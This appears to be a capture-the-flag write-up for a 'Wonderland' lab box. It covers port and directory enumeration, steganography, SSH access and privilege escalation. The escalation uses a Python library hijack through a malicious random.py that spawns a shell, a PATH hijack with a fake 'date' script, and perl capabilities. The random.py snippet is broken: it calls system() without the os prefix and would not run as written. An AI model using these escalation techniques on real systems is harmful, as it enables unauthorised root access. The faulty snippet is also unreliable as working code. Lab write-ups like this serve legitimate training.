# Wonderland

## Scanning & Footprinting

`sudo nmap -T4 -n -p- 10.10.1.140`

![Nmap Scan 1]()

`sudo nmap -T4 -n -A -p 22,80 10.10.1.140`

![Nmap Scan 2]()

here we got port 80 so lets open into the browser with devloper window.

## Port 80 enumeration

lets perform directory bruteforcing using gobuster

`gobuster dir -u http://10.10.1.140/`

![Gobuster Result]()

![img directory]()

here we got sus. directory. directory name **/r** and **img** page. **img** directory have some photos so download those using wget command and check any steg file is there or not without password.

`wget http://10.10.1.140/img/alice_door.jpg`

`steghide extract -sf alice_door.jpg`

![steg alice_door png]()

`wget http://10.10.1.140/img/white_rabbit_1.jpg`

`steghide extract -sf white_rabbit_1.jpg`

![steg white_rabbit_1 jpg]()

here we got **hint.txt** file from **white_rabbit_1.jpg**.

![hint txt]()

**follow the white rabbit** which i dont get it at first place so i decide to do one more level deep down to bruteforcing using gobuster. 

`gobuster dir -u "http://10.10.1.140/r/" -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -t 100 -q`

![gobuster scan 2]()

here we got one more directory **/a**, lets open it into browser.

![web page ra directory]()

**Keep Going**. So decide to do gobuster scanning.

`gobuster dir -u "http://10.10.1.140/r/a/" -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -t 100 -q`

![gobuster scan 3]()

here we got one more directory **/b**, lets open it into browser.

![web page ra directory]()

**Keep Going**. So once again decide to do gobuster bruteforcing.

![gobuster scan 4]()

after getting this result, now i can relate to the **hint.txt** file. lets try to open **/r/a/b/b/i/t/** directory into browser with devloper window.

![web page rabbit directory]()

here we got ssh credintials.

so lets test it.

## Port 22 enumeration

![alice account]()

but wait here got root flag; but we can't open it. and one more python file we got **walrus_and_the_carpenter.py**.

![walrus and the carpenter python program]()

first of all find the user flag first. lets run the find command to find the user flag.

`find / -type f -name "user.txt" -exec ls -l {} + 2>/dev/null`

![find command in alice]()

but we got nothing here. so i dicide to take hint.

**Hint: Everything is upside down here.**

now i got it. if root flag in to the user directory then user flag must be into the root directory so i used ls command to verify it.

`ls -l /root/user.txt`

![user flag found]()

now we need to privilege escalate and try to get the root access.

## Privilege Escalation

`sudo -l`

![sudo l command]()

here we got some intresting output. python3 pogram looks like run able by **rabbit** user also. As we know python program use **random** library, so lets spoof that library.

first of all lets check python library where it is calling from.

`python3 -c 'import sys; print(sys.path)'`

![python library path]()

here we can see the python program check first current folder for the **random** library. so we need to create eveil code into the file **random.py** in present alice home direcotry.

```python
import os

system("/bin/bash")
```

![evil random python code]()

lets run the python program as **rabbit** user.

`sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py`

![rabbit account]()

now we are the **rabbit** user. let go to the rabbit home direcotry.

![teaParty file]()

here we got **teaParty** file. for the binery inspection lets download it into own kali/parrot machine (using wget and python http server command) and load this binery file into **Ghedra** software.

![Gidra output]()

this binary file executes command like **date**. lets make own **date** command and spoof the actual **date** command.

```
#!/bin/bash

/bin/bash
```

Save this in **/tmp** directory and give the name **date**  and make it executable by using **chmod** command. add the **/tmp** directory into path variable. after making this file lets execute the **teaParty** program.

![date file and path]()

![hatter account]()

![hatter ssh password]()

here we got password, so lets test it into ssh port. here we can successful login to **hatter** user

![hatter ssh access]()

lets download **LinPeas** into the victem machine. using **wget** command. add the permission and run the LinPeas program

![LinPeas download]()

Lets analyze the LinPeas result.

![LinPeas output]()

here we can see perl capabilities. it can gives us root privilege. here i got refrence from [GTFOBins](https://gtfobins.github.io/gtfobins/perl/#capabilities). lets try to execute the command and get the root flag.

![root flag]()

THE END!!!